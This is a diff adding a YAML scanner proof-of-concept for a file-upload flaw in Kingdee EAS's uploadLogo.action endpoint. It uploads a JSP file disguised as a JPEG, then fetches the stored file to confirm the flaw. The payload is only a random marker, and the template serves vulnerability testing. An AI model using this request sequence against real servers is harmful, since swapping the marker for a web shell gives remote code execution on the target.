@@ -1,0 +1,34 @@
+id: poc-yaml-kingdee-eas-uploadLogo-file-upload
+info:
+  name: 金蝶 EAS uploadLogo.action 接口文件上传漏洞
+  severity: critical
+  tags:
+  - 两高一弱
+  - 文件上传
+  finger: 金蝶 EAS
+variables:
+  rand_str: random_str(16)
+requests:
+- method: POST
+  path: /plt_portal/setting/uploadLogo.action
+  headers:
+    Content-Type: multipart/form-data;boundary=----WebKitFormBoundary{{.rand_str}}
+  data: '------WebKitFormBoundary{{.rand_str}}
+
+    Content-Disposition: form-data; name="upload"; filename="test.jsp"
+
+    Content-Type: image/jpeg
+
+
+    {{.rand_str}}
+
+    ------WebKitFormBoundary{{.rand_str}}--
+
+    '
+  expression: status_code == 200 && contains(body, "gp.uploadLogoSuccess(")
+  output:
+  - regex_match(body, "\"nullLogo\",\"(?P<filename>.*?).jsp\"")
+- method: GET
+  path: /portal/res/file/upload/{{.filename}}.jsp
+  expression: status_code == 200 && contains(body, rand_str) && !contains(body, "<")
+transport: http
